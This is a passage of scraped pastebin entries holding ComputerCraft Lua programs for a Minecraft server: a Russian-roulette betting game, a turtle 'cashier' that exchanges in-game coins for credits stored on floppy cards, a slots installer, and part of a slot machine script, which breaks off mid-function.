        paintutils.drawFilledBox(1, 1, 51, 19, colors.green)
        term.clear()
        term.setCursorPos(5, 10)
        term.write(""{you don't have enough credits to continue}"")
        while fs.exists(""disk/"") do
            sleep(0,5)
        end
        os.reboot()
    else
        upperLimit = creds
    end
end
function writeCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    local Card = fs.open(""disk/creds.lua"", ""w"")
    data = (tostring(math.random(1, 163456))..""11066011""..tostring(creds)..""11077011""..tostring(math.random(1, 163456)))
    Card.write(tostring(data))
    Card.close()
    disk.setLabel(""bottom"", tostring(creds)..""$"")
end
local chamber = paintutils.loadImage(""images/chamber.nfp"")
local revolver = paintutils.loadImage(""images/revolver.nfp"")
function insert_card()
    paintutils.drawFilledBox(1, 1, 51, 19, colors.black)
    paintutils.drawImage(revolver, 14, 2)
    while not fs.exists(""disk/"") do
        term.clear()
        paintutils.drawFilledBox(1, 1, 51, 19, colors.black)
        paintutils.drawImage(revolver, 14, 2)
        term.setCursorPos(16, 10)
        term.setBackgroundColor(colors.black)
        term.write(""{please insert card}"")
        sleep(1)
    end
    term.clear()
end

function bettingText()
    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    term.clear()
    term.setCursorPos(18, 2)
    term.write(""{bidding amount}"")
    term.setCursorPos(2, 4)
    term.write(""every shot you take you earn ""..(perc * 100)..""% of your amount"")
    term.setCursorPos(24, 6)
    term.write(""|""..amount..""$|"")
    paintutils.drawPixel(30,8,colors.green)
    term.setCursorPos(30, 8)
    term.write(""+1"")
    term.setCursorPos(40, 8)
    term.write(""+10"")
    term.setCursorPos(30,12)
    term.write(""+100"")
    term.setCursorPos(40,12)
    term.write(""+1000"")
    term.setCursorPos(20, 8)
    term.write(""-1"")
    term.setCursorPos(10, 8)
    term.write(""-10"")
    term.setCursorPos(20,12)
    term.write(""-100"")
    term.setCursorPos(10,12)
    term.write(""-1000"")
    term.setCursorPos(24,17)
    term.write(""Enter"")
end


function betamount(change)
    amount = amount + change
    if amount < limit then
            amount = limit
            bettingText()
    elseif amount > upperLimit then
            amount = upperLimit
            bettingText()
    else
        bettingText()
    end
end
function insert_amount()
    amount = limit
    bettingText()
    local event, kb, x, y = os.pullEvent()
    enter = true
    while enter do
        if not fs.exists(""disk/creds.lua"") then
            os.reboot()
        end

        local event, kb, x, y = os.pullEvent()
        if event == ""monitor_touch"" and (x >= 30) and (x <= 33) and (y <= 9) and (y >= 7) and amount < creds then            
            betamount(1)
            kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 40) and (x <= 43) and (y <= 9) and (y >= 7) and amount < creds then            
            betamount(10)
            kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 30) and (x <= 33) and (y <= 13) and (y >= 11) and amount < creds then            
            betamount(100)
            kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 40) and (x <= 43) and (y <= 13) and (y >= 11) and amount < creds then            
            betamount(1000)
            kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 19) and (x <= 22) and (y <= 9) and (y >= 7) and amount > limit then
            betamount(-1)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 10) and (x <= 12) and (y <= 9) and (y >= 7) and amount > limit then
            betamount(-10)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 20) and (x <= 23) and (y <= 13) and (y >= 11) and amount > limit then
            betamount(-100)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 10) and (x <= 14) and (y <= 13) and (y >= 11) and amount > limit then
            betamount(-1000)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        kb = nil
        local event, kb, x, y = os.pullEvent()
        if event == ""monitor_touch"" and (x >= 24) and (x <= 27) and (y <= 19) and (y >= 16) then --- Needs to be touch screen button
            enter = false        --- Needs to be touch screen button
        end
    end
    creds = creds - amount
    writeCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    earn = amount * perc
end
-- function insert_amount()
-- 	amount = limit
--     paintutils.drawFilledBox(1, 1, 51, 19, colors.black)
--     enter = true
--     while enter do
--         if not fs.exists(""disk/creds.lua"") then
--             os.reboot()
--         end
--         term.clear()
--         term.setCursorPos(18, 6)
--         term.write(""{bidding amount}"")
--         term.setCursorPos(2, 7)
--         term.write(""every shot you take you earn ""..(perc * 100)..""% of your amount"")
--         term.setCursorPos(24, 10)
--         term.write(""|""..amount..""$|"")
--         local event, key, is_held = os.pullEvent(""key"")  
--         while key==keys.up and amount < creds do
            
--             amount = amount+1
--             term.setCursorPos(24, 10)
--             term.clear()
--             term.write(""|""..amount..""$|"")
--             term.setCursorPos(18, 6)
--             term.write(""{bidding amount}"")
--             term.setCursorPos(2, 7)
--             term.write(""every shot you take you earn ""..(perc * 100)..""% of your amount"")
--             key = nil
--             local event, key, is_held = os.pullEvent(""key"")  
--         end
--         while key==keys.down and amount>limit do
--             amount = amount-1
--             term.setCursorPos(24, 10)
--             term.clear()
--             term.write(""|""..amount..""$|"")
--             term.setCursorPos(18, 6)
--             term.write(""{bidding amount}"")
--             term.setCursorPos(2, 7)
--             term.write(""every shot you take you earn ""..(perc * 100)..""% of your amount"")
--             key = nil
--             local event, key, is_held = os.pullEvent(""key"")  
--         end
--         key = nil
--         local event, key, is_held = os.pullEvent(""key"") 
--         if key==keys.enter then
--             enter = false
--         end
--     end
--     creds = creds - amount
--     writeCard()
--     if not fs.exists(""disk/creds.lua"") then
--         os.reboot()
--     end
--     earn = amount * perc
-- end
function died()
    paintutils.drawFilledBox(1, 1, 51, 19, colors.white)
    sleep(1)
    term.setCursorPos(22, 9)
    term.blit(""You died"", ""77777777"", ""00000000"")
    sleep(3)
end
function game()
    paintutils.drawFilledBox(1, 1, 51, 19, colors.black)
    term.clear()
    term.setCursorPos(40, 8)
    term.setTextColor(1)
    term.write(earned..""$ earned"")
    paintutils.drawPixel(40,12,colors.green)
    term.setCursorPos(40,12)
    term.write(""Spin"")
    local bullet = math.random(6)
    paintutils.drawImage(chamber, 5, 4)
    ongoing = true
    local event, kb, x, y = os.pullEvent()
    while ongoing == true do
        local event, kb, x, y = os.pullEvent()
        if event == ""monitor_touch"" then
            term.setCursorPos(20, 1)
            if (24 <= x) and (x <= 26) and (5 <= y) and (y <= 6) and (one == true) then           --1
                if bullet == 1 then
                    ongoing = false
                    death = true
                    died()
                else
                    earned = earned + earn
                    one = false
                    term.blit(""1 is empty"", ""1111111111"", ""ffffffffff"")
                    paintutils.drawFilledBox(24, 5, 26, 6, colors.black)
                end
            elseif (30 <= x) and (x <= 32) and (8 <= y) and (y <= 9) and (two == true) then       --2
                if bullet == 2 then
                    ongoing = false
                    death = true
                    died()
                else
                    earned = earned + earn
                    two = false
                    term.blit(""2 is empty"", ""1111111111"", ""ffffffffff"")
                    paintutils.drawFilledBox(30, 8, 32, 9, colors.black)
                end
            elseif (30 <= x) and (x <= 32) and (12 <= y) and (y <= 13) and (three == true) then     --3
                if bullet == 3 then
                    ongoing = false
                    death = true
                    died()
                else
                    earned = earned + earn
                    three = false
                    term.blit(""3 is empty"", ""1111111111"", ""ffffffffff"")
                    paintutils.drawFilledBox(30, 12, 32, 13, colors.black)
                end
            elseif (24 <= x) and (x <= 26) and (15 <= y) and (y <= 16) and (four == true) then     --4
                if bullet == 4 then
                    ongoing = false
                    death = true
                    died()
                else
                    earned = earned + earn
                    four = false
                    term.blit(""4 is empty"", ""1111111111"", ""ffffffffff"")
                    paintutils.drawFilledBox(24, 15, 26, 16, colors.black)
                end
            elseif (18 <= x) and (x <= 20) and (12 <= y) and (y <= 13) and (five == true) then     --5
                if bullet == 5 then
                    ongoing = false
                    death = true
                    died()
                else
                    earned = earned + earn
                    five = false
                    term.blit(""5 is empty"", ""1111111111"", ""ffffffffff"")
                    paintutils.drawFilledBox(18, 12, 20, 13, colors.black)
                end
            elseif (18 <= x) and (x <= 20) and (8 <= y) and (y <= 9) and (six == true) then       --6
                if bullet == 6 then
                    ongoing = false
                    death = true
                    died()
                else
                    earned = earned + earn
                    six = false
                    term.blit(""6 is empty"", ""1111111111"", ""ffffffffff"")
                    paintutils.drawFilledBox(18, 8, 20, 9, colors.black)
                end
            elseif event == ""monitor_touch"" and (x >= 40) and (x <= 43) and (y <= 13) and (y >= 11) then --- Needs to be touch screen button
                term.setCursorPos(15, 1)
                term.blit(""you spun the chamber"", ""11111111111111111111"", ""ffffffffffffffffffff"")
                sleep(1)
                one = true
                two = true
                three = true
                four = true
                five = true
                six = true
                ongoing = false
            end
            term.setCursorPos(40, 8)
            term.write(earned..""$ earned"")
        
        end
    end
end

while 1 do
	earned = 0
    insert_card()
    readCard()
    insert_amount()
    writeCard()
    death = false
    one = true
    two = true
    three = true
    four = true
    five = true
    six = true
    while death == false do
        game()
    end
    readCard()
    creds = creds + earned
    writeCard()
end"
aua5eDqQ,Cashier Turtle,Honeth,Lua,Friday 7th of July 2023 12:10:57 AM CDT,"------------------------------------------------------------------
-- run this program on a turtle with on the right a disk drive and the back of the turtle a chest
-- This program is made for my slotmachiene and futere games.
-- to use this install this under the name startup
------------------------------------------------------------------
--        manual
--
-- place a turtle with on the left a disk drive en behind a chest 
-- (you can place any block above the chest to stop people from opening it)
-- here you can also change flopp's to Mcards
-------------------------------------------------------------------
-- changed to use Lightman's Currency where each coin has a certain worth
-------------------------------------------------------------------

local collectorFee = 10     --how many credits you want as fee when people collect there payout


---------------------------------------
local final_count = 0
local current_countCC = 0
local current_countIC = 0
local current_countGC = 0
local current_countEC = 0
local current_countDC = 0
local current_countNC = 0

local credsPerCC = 1
local credsPerIC = 10
local credsPerGC = 100
local credsPerEC = 1000
local credsPerDC = 10000
local credsPerNC = 100000

local creds_rtrn = 0
----------------------------------

function writeCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    local Card = fs.open(""disk/creds.lua"", ""w"")
    data = (tostring(math.random(1, 163456))..""11066011""..tostring(creds)..""11077011""..tostring(math.random(1, 163456)))
    Card.write(tostring(data))
    Card.close()
    disk.setLabel(""right"", ""Honcino credits: ""..tostring(creds))
    end    

function Pkey()
    local event, key = os.pullEvent(""key"")
    if key == keys.enter then
        conf = true
    end
end
function wait()
    sleep(1)
end

function turn()
    turtle.turnLeft()
    turtle.turnLeft()
end

function readCard()
    if not fs.exists(""disk/"") then
        os.reboot()
    end
    if not fs.exists(""disk/creds.lua"") then
        term.setCursorPos(10, 7)
        print(""This isn't a Mcard"")
        term.setCursorPos(8, 8)
        print(""Do you wan't to make it a Mcard?"")
        term.setCursorPos(12, 10)
        write("" Yes     >No<"")
        confi = false
        while confi == false do
            term.setCursorPos(12, 10)
            local event, key, isHeld = os.pullEvent(""key"")
            if key == keys.left then
                write("">Yes<     No "")
                confirm = true
            elseif key == keys.right then
                write("" Yes     >No<"")
                confirm = false
            elseif key == keys.enter then
                confi = true
            end
        end 
        
        term.clear()
        if confirm == true then
            local Card = fs.open(""disk/creds.lua"", ""w"")
            Card.write(""0987498011066011011077011"")
            Card.close()
            disk.setLabel(""right"", ""Honcino credits: 0"")
        else
            term.setCursorPos(8, 8)
            while fs.exists(""disk/"") do
                term.setCursorPos(8, 8)
                write(""please remove your disk"")
                sleep(0,5)
            end
        end
    end
    local Card = fs.open(""disk/creds.lua"", ""r"")
    data = Card.readAll()
    Card.close()
    a, b = string.find(data, ""11066011"")
    c, d = string.find(data, ""11077011"")
    creds = tonumber(string.sub(data, b+1, c-1))
end

function insert_card()
    paintutils.drawFilledBox(1, 1, 39, 13, colors.green)
    while not fs.exists(""disk/"") do
        term.clear()
        paintutils.drawFilledBox(1, 1, 39, 13, colors.green)
        term.setCursorPos(10, 6)
        term.write(""{please insert card}"")
        sleep(1)
    end
    term.clear()
end
function count_dia()
    current_countCC = 0
    current_countIC = 0
    current_countGC = 0
    current_countEC = 0
    current_countDC = 0
    current_countNC = 0
    for i=1,16 do
        if turtle.getItemCount(i) > 0 then
            local slot = turtle.getItemDetail(i)
            if slot.name == ""lightmanscurrency:coin_copper"" then
                current_countCC = current_countCC + slot.count
            elseif slot.name == ""lightmanscurrency:coin_iron"" then
                current_countIC = current_countIC + slot.count
            elseif slot.name == ""lightmanscurrency:coin_gold"" then
                current_countGC = current_countGC + slot.count
            elseif slot.name == ""lightmanscurrency:coin_emerald"" then
                current_countEC = current_countEC + slot.count
            elseif slot.name == ""lightmanscurrency:coin_diamond"" then
                current_countDC = current_countDC + slot.count
            elseif slot.name == ""lightmanscurrency:coin_netherite"" then
                current_countNC = current_countNC + slot.count
            end
        end
    end
    final_count = ((current_countCC * credsPerCC) + (current_countIC * credsPerIC) + (current_countGC * credsPerGC) + (current_countEC * credsPerEC) + (current_countDC * credsPerDC) + (current_countNC * credsPerNC))
    for i=1,16 do
        if turtle.getItemCount(i) > 0 then
            local slot = turtle.getItemDetail(i)
            if (slot.name ~= ""lightmanscurrency:coin_copper"") and (slot.name ~= ""lightmanscurrency:coin_iron"") and (slot.name ~= ""lightmanscurrency:coin_gold"") and (slot.name ~= ""lightmanscurrency:coin_emerald"") and (slot.name ~= ""lightmanscurrency:coin_diamond"") and (slot.name~= ""lightmanscurrency:coin_netherite"") then
                turtle.select(i)
                turtle.drop()
            end
        end
    end
    creds_rtrn = final_count
end
function wdORdp()
    local action = ""deposit""
    enter = false
    term.setCursorPos(8, 10)
    term.clear()
    write("" withdraw     >deposit<"")
    while enter == false do
        term.setCursorPos(11, 3)
        term.write(""you currently have:"")
        term.setCursorPos(20,5)
        term.write(""""..creds.."""")
        term.setCursorPos(12,7)
        term.write("" Honcino credits"")
        term.setCursorPos(8, 10)
        local event, key, isHeld = os.pullEvent(""key"")
        if not fs.exists(""disk/creds.lua"") then
            os.reboot()
        end
        if key == keys.left then
            write("">withdraw<     deposit "")
            action = ""withdraw""
        elseif key == keys.right then
            write("" withdraw     >deposit<"")
            action = ""deposit""
        end
        if key == keys.enter then
            enter = true
            return action;
        end
    end
end
function transaction()
    term.clear()

    if action == ""deposit"" then

        conf = false
        while conf == false do
            if not fs.exists(""disk/creds.lua"") then
                os.reboot()
            end
            count_dia()
            term.clear()
            term.setCursorPos(10, 4)
            term.write(""do you want to deposit"")
            term.setCursorPos(10, 6)
            term.write(""|""..final_count..""| Copper coins"")
            term.setCursorPos(10, 8)
            term.write(""for"")
            term.setCursorPos(10,10)
            term.write(""|""..creds_rtrn..""| Honcino credits?"")
            parallel.waitForAny(Pkey, wait)   
        end
        turn()
        current_countCC = 0
        current_countIC = 0
        current_countGC = 0
        current_countEC = 0
        current_countDC = 0
        current_countNC = 0
        for i=1,16 do
            
            if turtle.getItemCount(i) > 0 then
                turtle.select(i)
                local slot = turtle.getItemDetail(i)
                if slot.name == ""lightmanscurrency:coin_copper"" then
                    current_countCC = current_countCC + slot.count
                elseif slot.name == ""lightmanscurrency:coin_iron"" then
                    current_countIC = current_countIC + slot.count
                elseif slot.name == ""lightmanscurrency:coin_gold"" then
                    current_countGC = current_countGC + slot.count
                elseif slot.name == ""lightmanscurrency:coin_emerald"" then
                    current_countEC = current_countEC + slot.count
                elseif slot.name == ""lightmanscurrency:coin_diamond"" then
                    current_countDC = current_countDC + slot.count
                elseif slot.name == ""lightmanscurrency:coin_netherite"" then
                    current_countNC = current_countNC + slot.count
                end
            end
            turtle.drop()

        end
        turn()
        final_count = ((current_countCC * credsPerCC) + (current_countIC * credsPerIC) + (current_countGC * credsPerGC) + (current_countEC * credsPerEC) + (current_countDC * credsPerDC) + (current_countNC * credsPerNC))
        creds_rtrn = final_count
        creds = creds + creds_rtrn
        
    
        writeCard()
    end
    if action == ""withdraw"" then

        paintutils.drawFilledBox(1, 1, 51, 19, colors.green)
        local currencywit = 0
        local creds_rtrn = currencywit * credsPerEC
        term.clear()
        term.setCursorPos(10, 4)
        term.write(""do you want to withdraw"")
        term.setCursorPos(10, 6)
        term.write(""|""..currencywit..""| Emerald Coins"")
        term.setCursorPos(10, 8)
        term.write(""for"")
        term.setCursorPos(10,10)
        term.write(""|""..creds_rtrn..""| Honcino credits"")
        conf = false
        while conf == false do
            local creds_rtrn = currencywit * credsPerCC
            local event, key = os.pullEvent(""key"")
            if key == keys.up and creds_rtrn < creds then
                currencywit = currencywit + 1
                if ((currencywit * credsPerCC) + collectorFee) > creds then
                    currencywit = currencywit -1
                end
                term.clear()
                term.setCursorPos(10, 4)
                term.write(""do you want to withdraw"")
                term.setCursorPos(10, 6)
                term.write(""|""..currencywit..""| Emerald Coins"")
                term.setCursorPos(10, 8)
                term.write(""for"")
                term.setCursorPos(10,10)
                term.write(""|""..currencywit * credsPerEC..""| Honcino credits"")
            elseif key == keys.down and creds_rtrn > 0 then
                currencywit = currencywit - 1
                
                term.clear()
                term.setCursorPos(10, 4)
                term.write(""do you want to withdraw"")
                term.setCursorPos(10, 6)
                term.write(""|""..currencywit..""| Emerald Coins"")
                term.setCursorPos(10, 8)
                term.write(""for"")
                term.setCursorPos(10,10)
                term.write(""|""..currencywit * credsPerEC..""| Honcino credits"")
            elseif key == keys.enter then
                conf = true
            end
            
            

        end
        local creds_rtrn = currencywit * credsPerEC
        local beforecreds = creds
        creds = creds - creds_rtrn - collectorFee
        if beforecreds <= creds_rtrn then
        	creds = beforecreds
        	writeCard()
        	term.clear()
        	term.setCursorPos(3,5)
        	term.write(""Insufficient credits on your card!"")
        	term.setCursorPos(3,8)
        	term.write(""Please try again!"")
        	sleep(2)
        else
    	    term.clear()
    	    term.setCursorPos(10, 6)
    	    term.write(""See you soon!"")
    	    writeCard()
    	    turn()
    	    turtle.select(1)
    	    stacks = currencywit / 64
    	    while stacks >= 1 do
    	        turtle.suck(64)
    	        stacks = stacks-1
    	    end
    	    local succes = turtle.suck(stacks*64)
    	    if succes == false then
    	        for i=1,16 do
    	            turtle.select(i)
    	            turtle.drop()
    	        end
    	        turn()
    	        creds = beforecreds
    	        writeCard()
    	        term.clear()
    	        term.setCursorPos(4, 4)
    	        term.write(""Not enough coins in the vault!"")
    	        term.setCursorPos(7, 6)
    	        term.write(""please come back later!"")
    	        sleep(2)
            
        	elseif succes == true then
            	turn()
            	for i=1,16 do
                	turtle.select(i)
                	turtle.drop()
            	end
        	end
        end

    end
end
while 1 do
   	insert_card()
   	readCard()
   	while fs.exists(""disk/creds.lua"") do
       	readCard()
       	action = wdORdp()
       	transaction()
    end
end"
sF02Pgjs,slotsinstaller,Honeth,Lua,Friday 7th of July 2023 12:08:55 AM CDT,"local confirm = false
local install = false
function text()
    term.setCursorPos(13, 7)
    print(""this will create a startup."")
    term.setCursorPos(14, 8)
    print(""do you want to continue?"")
end
function confirmation()
    term.setCursorPos(18, 10)
    local event, key, isHeld = os.pullEvent(""key"")
    if key == keys.left then
        write("">Yes<     No "")
        confirm = true
    elseif key == keys.right then
        write("" Yes     >No<"")
        confirm = false
    end

end

term.clear()
term.setCursorPos(18, 10)
print("" Yes     >No<"")
while install == false do
    text()
    confirmation()
    local event, key, isHeld = os.pullEvent(""key"")
    if confirm and key == keys.enter then
        install = true
    end
end
term.clear()
term.setCursorPos(1, 1)
shell.run(""pastebin get 0tvz4RND startup.lua"")
shell.run(""pastebin get C7mSXvqy images/orange.nfp"")
shell.run(""pastebin get 7UdcsVhG images/none.nfp"")
shell.run(""pastebin get JCsUT1nd images/dollar.nfp"")
shell.run(""pastebin get 3t7A2zNU images/bell.nfp"")
shell.run(""pastebin get r9Y2Ma0j images/7.nfp"")
shell.run(""pastebin get 2aagtpwg images/diamond.nfp"")"
0tvz4RND,startup.lua,Honeth,Lua,Friday 7th of July 2023 12:08:13 AM CDT,"term.redirect(peripheral.wrap(""left""))
local buttonSide = peripheral.wrap(""left"")
local btnX, btnY = buttonSide.getSize()
term.setCursorPos(1,1)
term.clear()
print(btnX)
print(btnY)
sleep(1)

local limit = 10     --minimum creds to play
local upperLimit = 0

---------------------	percentage to win the following
local diamondW = 2		-- % chance to land diamond
local dollarW = 3		-- % chance to land dollar
local sevenW = 4		-- % chance to land seven
local bellW = 5		-- % chance to land bell
local orangeW = 6		-- % chance to land orange




--don't change enything after this
----------------------
local orangech = 30   --this is for asteticts no change needed
local diamondch = 5
local bellch = 20
local sevench = 15
local dollarch = 10
-------calc ast----------------
local a = 0
local b = diamondch
local c = b + bellch
local d = c + sevench
local e = d + dollarch
local f = e + orangech
local g = 100
------calc W------------
local aW = 0
local bW = diamondW
local cW = bW + dollarW
local dW = cW + sevenW
local eW = dW + bellW
local fW = eW + orangeW
local gW = 100
-----------------------
local creds = 0
local newCreds = 0
local nr1 = 0
multeplier = 0
local amount = limit
-----------------------


paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
function readCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    local Card = fs.open(""disk/creds.lua"", ""r"")
    data = Card.readAll()
    Card.close()
    a, b = string.find(data, ""11066011"")
    c, d = string.find(data, ""11077011"")
    creds = tonumber(string.sub(data, b+1, c-1))
    if creds < limit then
        paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
        term.clear()
        term.setCursorPos(5, 10)
        term.write(""{you don't have enough credits to continue}"")
        while fs.exists(""disk/"") do
            sleep(0,5)
        end
        os.reboot()
    else
        upperLimit = creds
    end
    

end
function writeCard()
    readCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    local Card = fs.open(""disk/creds.lua"", ""w"")
    data = (tostring(math.random(1, 163456))..""11066011""..tostring(newCreds)..""11077011""..tostring(math.random(1, 163456)))
    Card.write(tostring(data))
    Card.close()
    disk.setLabel(""bottom"", ""Honcino credits: ""..tostring(newCreds))
end    
function insert_card()
    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    while not fs.exists(""disk/"") do
        term.clear()
        paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
        term.setCursorPos(16, 10)
        term.write(""{please insert card}"")
        sleep(1)
    end
    term.clear()
end

function bettingText()
	paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    term.clear()
    term.setCursorPos(18, 4)
    term.write(""{bidding amount}"")
    term.setCursorPos(24, 6)
    term.write(""|""..amount..""$|"")
    paintutils.drawPixel(30,8,colors.green)
    term.setCursorPos(30, 8)
    term.write(""+1"")
    term.setCursorPos(40, 8)
    term.write(""+10"")
    term.setCursorPos(30,12)
    term.write(""+100"")
    term.setCursorPos(40,12)
    term.write(""+1000"")
    term.setCursorPos(20, 8)
    term.write(""-1"")
    term.setCursorPos(10, 8)
   	term.write(""-10"")
   	term.setCursorPos(20,12)
   	term.write(""-100"")
   	term.setCursorPos(10,12)
   	term.write(""-1000"")
    term.setCursorPos(24,17)
    term.write(""Enter"")
end


function betamount(change)
	amount = amount + change
	if amount < limit then
        	amount = limit
        	bettingText()
    elseif amount > upperLimit then
            amount = upperLimit
            bettingText()
    else
    	bettingText()
    end
end

function insert_amount()
	amount = limit
    bettingText()
    local event, kb, x, y = os.pullEvent()
    enter = true
    while enter do
        if not fs.exists(""disk/creds.lua"") then
            os.reboot()
        end

        local event, kb, x, y = os.pullEvent()
        if event == ""monitor_touch"" and (x >= 30) and (x <= 33) and (y <= 9) and (y >= 7) and amount < creds then            
            betamount(1)
       		kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 40) and (x <= 43) and (y <= 9) and (y >= 7) and amount < creds then            
            betamount(10)
       		kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 30) and (x <= 33) and (y <= 13) and (y >= 11) and amount < creds then            
            betamount(100)
       		kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 40) and (x <= 43) and (y <= 13) and (y >= 11) and amount < creds then            
            betamount(1000)
       		kb = nil
            local event, kb= os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 19) and (x <= 22) and (y <= 9) and (y >= 7) and amount > limit then
            betamount(-1)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 10) and (x <= 12) and (y <= 9) and (y >= 7) and amount > limit then
            betamount(-10)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 20) and (x <= 23) and (y <= 13) and (y >= 11) and amount > limit then
            betamount(-100)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        if event == ""monitor_touch"" and (x >= 10) and (x <= 14) and (y <= 13) and (y >= 11) and amount > limit then
            betamount(-1000)
            kb = nil
            local event, kb = os.pullEvent(""monitor_touch"")  
        end
        kb = nil
        local event, kb, x, y = os.pullEvent()
        if event == ""monitor_touch"" and (x >= 24) and (x <= 27) and (y <= 19) and (y >= 16) then --- Needs to be touch screen button
            enter = false        --- Needs to be touch screen button
        end
    end
    newCreds = creds - amount

    writeCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
end


--------symbols-----------
local diamond = paintutils.loadImage(""images/diamond.nfp"") -- a,b
local bell = paintutils.loadImage(""images/bell.nfp"")       -- b,c
local seven = paintutils.loadImage(""images/7.nfp"")         -- c,d
local dollar = paintutils.loadImage(""images/dollar.nfp"")   -- d,e
local orange = paintutils.loadImage(""images/orange.nfp"")   -- e,f
local none = paintutils.loadImage(""images/none.nfp"")       -- the rest


function slotmachiene()
    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    paintutils.drawFilledBox(5, 1, 46, 19, colors.lightGray)
    paintutils.drawLine(5, 1, 5, 19, colors.white)
    paintutils.drawLine(19, 1, 19, 19, colors.white)
    paintutils.drawLine(33, 1, 33, 19, colors.white)
    paintutils.drawLine(47, 1, 47, 19, colors.white)
    paintutils.drawLine(2, 10, 5, 10, colors.gray)
    paintutils.drawLine(47, 10, 50, 10, colors.gray)
end
function result()
    nr4 = math.random(100)
    if nr4 < bW then
        multeplier = 2
        price = 1
    elseif nr4 < cW then
        multeplier = 1.75
        price = 2
    elseif nr4 < dW then
        multeplier = 1.5
        price = 3
    elseif nr4 < eW then
        multeplier = 1.25
        price = 4
    elseif nr4 < fW then
        multeplier = 1
        price = 5
    else
        price = 6
        multeplier = 0
    end
end
function random_1()
    paintutils.drawFilledBox(6, 1, 18, 19, colors.lightGray)
    for i=1,3 do
        h = (i * 6) - 4
        nr1 = math.random(100)
        if nr1 < b then
            paintutils.drawImage(diamond, 8, h)
        elseif nr1 < c then
            paintutils.drawImage(bell, 8, h)
        elseif nr1 < d then
            paintutils.drawImage(seven, 8, h)
        elseif nr1 < e then
            paintutils.drawImage(dollar, 8, h)
        elseif nr1 < f then
            paintutils.drawImage(orange, 8, h)
        elseif nr1 <= 100 then
            paintutils.drawImage(none, 8, h)
        end
    end
    
end

function random_2()
    paintutils.drawFilledBox(20, 1, 32, 19, colors.lightGray)
    for i=4,6 do
        h = ((i - 3) * 6) - 4
        nr2 = math.random(100)
        if nr2 < b then
            paintutils.drawImage(diamond, 22, h)
        elseif nr2 < c then
            paintutils.drawImage(bell, 22, h)
        elseif nr2 < d then
            paintutils.drawImage(seven, 22, h)
        elseif nr2 < e then
            paintutils.drawImage(dollar, 22, h)
        elseif nr2 < f then
            paintutils.drawImage(orange, 22, h)
        elseif nr2 <= 100 then
            paintutils.drawImage(none, 22, h)
        end
    end
    
end

function random_3()
    paintutils.drawFilledBox(34, 1, 46, 19, colors.lightGray)
    for i=7,9 do
        h = ((i - 6) * 6) - 4
        nr3 = math.random(100)
        if nr3 < b then
            paintutils.drawImage(diamond, 36, h)
        elseif nr3 < c then
            paintutils.drawImage(bell, 36, h)
        elseif nr3 < d then
            paintutils.drawImage(seven, 36, h)
        elseif nr3 < e then
            paintutils.drawImage(dollar, 36, h)
        elseif nr3 < f then
            paintutils.drawImage(orange, 36, h)
        elseif nr3 <= 100 then
            paintutils.drawImage(none, 36, h)
        end
    end
    
end

function roll()
    for x=1,25 do
        random_1()
        random_2()
        random_3()
        sleep(0,5)
    end
    
    if price == 1 then
        paintutils.drawFilledBox(6, 7, 18, 13, colors.lightGray)
        paintutils.drawImage(diamond, 8, 8)
    elseif price == 2 then
        paintutils.drawFilledBox(6, 7, 18, 13, colors.lightGray)
        paintutils.drawImage(dollar, 8, 8)
    elseif price == 3 then
        paintutils.drawFilledBox(6, 7, 18, 13, colors.lightGray)
        paintutils.drawImage(seven, 8, 8)
    elseif price == 4 then
        paintutils.drawFilledBox(6, 7, 18, 13, colors.lightGray)
        paintutils.drawImage(bell, 8, 8)
    elseif price == 5 then
        paintutils.drawFilledBox(6, 7, 18, 13, colors.lightGray)
        paintutils.drawImage(orange, 8, 8)
    end
    for x=1,25 do   
        random_2()
        random_3()
        sleep(0,5)
    end

    if price == 1 then
        paintutils.drawFilledBox(20, 7, 32, 13, colors.lightGray)
        paintutils.drawImage(diamond, 22, 8)
    elseif price == 2 then
        paintutils.drawFilledBox(20, 7, 32, 13, colors.lightGray)
        paintutils.drawImage(dollar, 22, 8)
    elseif price == 3 then
        paintutils.drawFilledBox(20, 7, 32, 13, colors.lightGray)
        paintutils.drawImage(seven, 22, 8)
    elseif price == 4 then
        paintutils.drawFilledBox(20, 7, 32, 13, colors.lightGray)
        paintutils.drawImage(bell, 22, 8)
    elseif price == 5 then
        paintutils.drawFilledBox(20, 7, 32, 13, colors.lightGray)
        paintutils.drawImage(orange, 22, 8)
    end
    for x=1,25 do
        random_3()
        sleep(0,5)
    end
    
    if price == 1 then
